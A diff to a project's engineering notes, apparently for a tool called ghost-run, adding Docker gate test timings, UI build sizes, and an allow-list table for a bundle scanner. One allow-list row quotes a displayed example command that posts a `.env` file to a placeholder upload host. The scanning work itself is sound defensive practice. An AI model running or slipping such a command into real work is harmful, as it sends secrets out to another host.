@@ -462,3 +462,40 @@ Wall time of `docker exec ... sh -c "npm test"` on the host in a warm box with t
 Samples of the `docker exec` series (s): 0.192, 0.182, 0.180, 0.191, 0.199. Load after the check: 5.91 (HIGH, above 4).
 
 Note on the timing measurement above: an earlier complete run of the same script (started at load 3.74) was discarded because Spotlight indexing and other host processes drove the 1-minute load to about 40 during the run (S3 to S5 `copyMs` up to 2.4 s, `fingerprintBeforeMs` up to 3.6 s, a negative wall-clock extra cost per step). The script now places the fixture beside a `.metadata_never_index` marker and waits for load below 4 before starting. The reported run started at load 3.98 and the 1-minute load rose to 4.3 to 6.0 while it ran (see the per-series load row), so values are close to, but not strictly under, the "load below about 4" condition.
+
+## Gate Docker tests (kiro-integration task 8.10)
+
+`integrations/kiro-hook/tests/gate-docker.test.mjs`, run twice with `corepack pnpm exec vitest run tests/gate-docker.test.mjs` on a warm box image (macOS, Docker Desktop).
+
+| Measurement | Run 1 | Run 2 |
+|---|---|---|
+| Five scenario gate processes, one hook call each (ms) | 812, 612, 671, 743, 742 | 755, 673, 780, 784, 726 |
+| Watchdog kill of a hung runner (`sleep 120`, watchdog set to 12 s) (ms) | 12214 | 12161 |
+| Whole file (s) | 18.9 | 16.9 |
+
+After each run `docker ps -a` and `docker volume ls` showed no ghost-run container or volume.
+
+## ui-kit dist scan (task 9.3, Open Question Q5)
+
+Build: `corepack pnpm --filter @ghost-run/ui build` (Vite 7.3.8, React production bundle). Scan: `ui/tests/dist/dist-scan.test.ts` applies `scanDist` to every file under `ui/dist`. The built page points to no external origin: `index.html` has only relative `script` and `link` references and the exact CSP meta tag.
+
+### Build output sizes
+
+| File | Size (bytes) | Size (kB) | Gzip (kB) |
+|---|---|---|---|
+| `dist/index.html` | 912 | 0.91 | 0.48 |
+| `dist/assets/style-BvopEnvY.css` | 9124 | 9.12 | 2.56 |
+| `dist/assets/index-BfhVXFiq.js` | 269934 | 269.93 | 83.98 |
+
+### Allow-list entries (`DIST_ALLOW_LIST` in `ui/tests/support/dist-scan.ts`)
+
+| Rule | Matched text | Reason |
+|---|---|---|
+| `external-origin` | `"https://<react docs host>/errors/"+` (2 copies) | React production error decoder prefix. Concatenated into an error message only, never requested. The CSP also sets `connect-src 'none'`. |
+| `external-origin` | `curl -d @.env https://${...}/upload` (2 places) | Gallery sample data, a displayed possession-example command. The host is a template variable bound to a reserved `.example` host. Text on screen, not a loaded URL. |
+| `analytics` | `segment: {number:` | False positive on the word "segment" (red-thread line parts). No analytics code exists. |
+| `inline-script` | `javascript:throw new Error('React has blocked` | React DOM message for a refused `javascript:` URL. A string in an error, not a link or script. |
+
+No `fetch(` token is in the bundle (only `prefetchDNS` and `fetchPriority`), so no `network-api` entry is needed. The runtime proof stays the throwing-stub test of task 8.17.
+
+Scanner fix found by this run: Vite writes the CSP attribute with `&#39;` for apostrophes, so `attr()` now decodes HTML entities before comparing the policy string.
